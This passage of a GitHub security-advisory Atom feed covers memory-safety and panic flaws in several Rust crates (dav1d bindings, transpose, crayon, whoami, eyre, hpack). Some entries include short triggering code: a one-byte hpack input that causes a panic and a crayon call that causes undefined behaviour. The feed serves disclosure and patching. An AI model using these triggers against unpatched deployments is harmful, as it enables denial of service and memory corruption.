<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32884">https://nvd.nist.gov/vuln/detail/CVE-2024-32884</a></li>
<li><a href="https://github.com/advisories/GHSA-98p4-xjmm-8mfh">https://github.com/advisories/GHSA-98p4-xjmm-8mfh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-98p4-xjmm-8mfh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-15T19:33:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[libdav1d-sys] libdav1d-sys affected by dav1d AV1 decoder integer overflow]]></title>
        <id>https://github.com/advisories/GHSA-mc39-h54g-pvw6</id>
        <link href="https://github.com/advisories/GHSA-mc39-h54g-pvw6"/>
        <updated>2024-04-05T15:42:40.000Z</updated>
        <content type="html"><![CDATA[<p>An integer overflow in dav1d AV1 decoder that can occur when decoding videos with large frame size. This can lead to memory corruption within the AV1 decoder. We recommend upgrading to version 0.7.0 of libdav1d-sys, which includes dav1d 1.4.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0016.html">https://rustsec.org/advisories/RUSTSEC-2024-0016.html</a></li>
<li><a href="https://www.cvedetails.com/cve/CVE-2024-1580">https://www.cvedetails.com/cve/CVE-2024-1580</a></li>
<li><a href="https://github.com/advisories/GHSA-mc39-h54g-pvw6">https://github.com/advisories/GHSA-mc39-h54g-pvw6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mc39-h54g-pvw6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-05T15:42:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[transpose] transpose: Buffer overflow due to integer overflow]]></title>
        <id>https://github.com/advisories/GHSA-5gmm-6m36-r7jh</id>
        <link href="https://github.com/advisories/GHSA-5gmm-6m36-r7jh"/>
        <updated>2024-04-05T15:41:34.000Z</updated>
        <content type="html"><![CDATA[<p>Given the function <code>transpose::transpose</code>:</p>
<pre><code class="language-rust">fn transpose&lt;T: Copy&gt;(input: &amp;[T], output: &amp;mut [T], input_width: usize, input_height: usize)
</code></pre>
<p>The safety check <code>input_width * input_height == output.len()</code> can fail due to <code>input_width * input_height</code> overflowing in such a way that it equals <code>output.len()</code>.
As a result of failing the safety check, memory past the end of <code>output</code> is written to. This only occurs in release mode since <code>*</code> panics on overflow in debug mode.</p>
<p>Exploiting this issue requires the caller to pass <code>input_width</code> and <code>input_height</code> arguments such that multiplying them overflows, and the overflown result equals the lengths of input and output slices.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ejmahler/transpose/issues/11">https://github.com/ejmahler/transpose/issues/11</a></li>
<li><a href="https://github.com/ejmahler/transpose/commit/c4bcd39fabca9a31a401d0cc42d4090869b5a37a">https://github.com/ejmahler/transpose/commit/c4bcd39fabca9a31a401d0cc42d4090869b5a37a</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2023-0080.html">https://rustsec.org/advisories/RUSTSEC-2023-0080.html</a></li>
<li><a href="https://github.com/advisories/GHSA-5gmm-6m36-r7jh">https://github.com/advisories/GHSA-5gmm-6m36-r7jh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5gmm-6m36-r7jh</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-04-05T15:41:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[crayon] crayon: ObjectPool creates uninitialized memory when freeing objects]]></title>
        <id>https://github.com/advisories/GHSA-xfhw-6mc4-mgxf</id>
        <link href="https://github.com/advisories/GHSA-xfhw-6mc4-mgxf"/>
        <updated>2024-04-05T15:40:47.000Z</updated>
        <content type="html"><![CDATA[<p>As of version 0.6.0, the ObjectPool explicitly creates an uninitialized instance of its type parameter when it attempts to free an object, and swaps it into the storage. This causes instant undefined behavior due to reading the uninitialized memory in order to write it to the pool storage.</p>
<p>Extremely basic usage of the crate can trigger this issue, e.g. this code from a doctest:</p>
<pre><code class="language-rust">use crayon::prelude::*;
application::oneshot().unwrap();

let mut params = MeshParams::default();

let mesh = video::create_mesh(params, None).unwrap();

// Deletes the mesh object.
video::delete_mesh(mesh); // &lt;-- UB
</code></pre>
<p>The Clippy warning for this code was silenced in commit c2fde19caf6149d91faa504263f0bc5cafc35de5.</p>
<p>Discovered via <a href="https://asan.saethlin.dev/ub?crate=crayon&amp;version=0.7.1">https://asan.saethlin.dev/ub?crate=crayon&amp;version=0.7.1</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/shawnscode/crayon/issues/109">https://github.com/shawnscode/crayon/issues/109</a></li>
<li><a href="https://github.com/shawnscode/crayon/commit/c2fde19caf6149d91faa504263f0bc5cafc35de5">https://github.com/shawnscode/crayon/commit/c2fde19caf6149d91faa504263f0bc5cafc35de5</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0018.html">https://rustsec.org/advisories/RUSTSEC-2024-0018.html</a></li>
<li><a href="https://github.com/advisories/GHSA-xfhw-6mc4-mgxf">https://github.com/advisories/GHSA-xfhw-6mc4-mgxf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xfhw-6mc4-mgxf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-05T15:40:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[whoami] whoami stack buffer overflow on several Unix platforms]]></title>
        <id>https://github.com/advisories/GHSA-w5w5-8vfh-xcjq</id>
        <link href="https://github.com/advisories/GHSA-w5w5-8vfh-xcjq"/>
        <updated>2024-04-05T15:39:19.000Z</updated>
        <content type="html"><![CDATA[<p>With versions of the whoami crate &gt;= 0.5.3 and &lt; 1.5.0, calling any of these functions leads to an immediate stack buffer overflow on illumos and Solaris:</p>
<ul>
<li><code>whoami::username</code></li>
<li><code>whoami::realname</code></li>
<li><code>whoami::username_os</code></li>
<li><code>whoami::realname_os</code></li>
</ul>
<p>With versions of the whoami crate &gt;= 0.5.3 and &lt; 1.0.1, calling any of the above functions also leads to a stack buffer overflow on these platforms:</p>
<ul>
<li>Bitrig</li>
<li>DragonFlyBSD</li>
<li>FreeBSD</li>
<li>NetBSD</li>
<li>OpenBSD</li>
</ul>
<p>This occurs because of an incorrect definition of the <code>passwd</code> struct on those platforms.</p>
<p>As a result of this issue, denial of service and data corruption have both been observed in the wild. The issue is possibly exploitable as well.</p>
<p>This vulnerability also affects other Unix platforms that aren't Linux or macOS.</p>
<p>This issue has been addressed in whoami 1.5.0.</p>
<p>For more information, see <a href="https://github.com/ardaku/whoami/issues/91">this GitHub issue</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ardaku/whoami/issues/91">https://github.com/ardaku/whoami/issues/91</a></li>
<li><a href="https://github.com/ardaku/whoami/commit/d6ee13ed9e818aa51b8d86d95e8009a376289a40">https://github.com/ardaku/whoami/commit/d6ee13ed9e818aa51b8d86d95e8009a376289a40</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0020.html">https://rustsec.org/advisories/RUSTSEC-2024-0020.html</a></li>
<li><a href="https://github.com/advisories/GHSA-w5w5-8vfh-xcjq">https://github.com/advisories/GHSA-w5w5-8vfh-xcjq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w5w5-8vfh-xcjq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-05T15:39:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[eyre] eyre: Parts of Report are dropped as the wrong type during downcast]]></title>
        <id>https://github.com/advisories/GHSA-4v52-7q2x-v4xj</id>
        <link href="https://github.com/advisories/GHSA-4v52-7q2x-v4xj"/>
        <updated>2024-04-05T15:08:54.000Z</updated>
        <content type="html"><![CDATA[<p>In affected versions, after a <code>Report</code> is constructed using <code>wrap_err</code> or <code>wrap_err_with</code> to attach a message of type <code>D</code> onto an error of type <code>E</code>, then using <code>downcast</code> to recover ownership of either the value of type <code>D</code> or the value of type <code>E</code>, one of two things can go wrong:</p>
<ul>
<li><p>If downcasting to <code>E</code>, there remains a value of type <code>D</code> to be dropped. It is incorrectly "dropped" by running <code>E</code>'s drop behavior, rather than <code>D</code>'s. For example if <code>D</code> is <code>&amp;str</code> and <code>E</code> is <code>std::io::Error</code>, there would be a call of <code>std::io::Error::drop</code> in which the reference received by the <code>Drop</code> impl does not refer to a valid value of type <code>std::io::Error</code>, but instead to <code>&amp;str</code>.</p>
</li>
<li><p>If downcasting to <code>D</code>, there remains a value of type <code>E</code> to be dropped. When <code>D</code> and <code>E</code> do not happen to be the same size, <code>E</code>'s drop behavior is incorrectly executed in the wrong location. The reference received by the <code>Drop</code> impl may point left or right of the real <code>E</code> value that is meant to be getting dropped.</p>
</li>
</ul>
<p>In both cases, when the <code>Report</code> contains an error <code>E</code> that has nontrivial drop behavior, the most likely outcome is memory corruption.</p>
<p>When the <code>Report</code> contains an error <code>E</code> that has trivial drop behavior (for example a <code>Utf8Error</code>) but where <code>D</code> has nontrivial drop behavior (such as <code>String</code>), the most likely outcome is that downcasting to <code>E</code> would leak <code>D</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/eyre-rs/eyre/issues/141">https://github.com/eyre-rs/eyre/issues/141</a></li>
<li><a href="https://github.com/eyre-rs/eyre/commit/770ac3fa1435eae3b166a4b072053360e38a0575">https://github.com/eyre-rs/eyre/commit/770ac3fa1435eae3b166a4b072053360e38a0575</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0021.html">https://rustsec.org/advisories/RUSTSEC-2024-0021.html</a></li>
<li><a href="https://github.com/advisories/GHSA-4v52-7q2x-v4xj">https://github.com/advisories/GHSA-4v52-7q2x-v4xj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4v52-7q2x-v4xj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-05T15:08:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[hpack] HPACK decoder panics on invalid input]]></title>
        <id>https://github.com/advisories/GHSA-w7hm-hmxv-pvhf</id>
        <link href="https://github.com/advisories/GHSA-w7hm-hmxv-pvhf"/>
        <updated>2024-04-05T15:06:28.000Z</updated>
        <content type="html"><![CDATA[<p>Due to insufficient checking of input data, decoding certain data sequences can lead to <em>Decoder::decode</em> panicking rather than returning an error.</p>
<p>Example code that triggers this vulnerability looks like this:</p>
<pre><code class="language-rust">use hpack::Decoder;

pub fn main() {
  let input = &amp;[0x3f];
  let mut decoder = Decoder::new();
  let _ = decoder.decode(input);
}
</code></pre>
<p>hpack is unmaintained. A crate with the panics fixed has been published as <a href="https://crates.io/crates/hpack-patched">hpack-patched</a>.</p>
<p>Also consider using <a href="https://crates.io/crates/fluke-hpack">fluke-hpack</a> or <a href="https://crates.io/crates/httlib-huffman">httlib-huffman</a> as an alternative.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mlalic/hpack-rs/issues/11">https://github.com/mlalic/hpack-rs/issues/11</a></li>
<li><a href="https://github.com/sno2/hpack-rs-patched/commit/d669282924a95311599e9e7dd53869ee96b3a2f5">https://github.com/sno2/hpack-rs-patched/commit/d669282924a95311599e9e7dd53869ee96b3a2f5</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2023-0085.html">https://rustsec.org/advisories/RUSTSEC-2023-0085.html</a></li>
<li><a href="https://github.com/advisories/GHSA-w7hm-hmxv-pvhf">https://github.com/advisories/GHSA-w7hm-hmxv-pvhf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w7hm-hmxv-pvhf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-05T15:06:27.000Z</published>
    </entry>
</feed>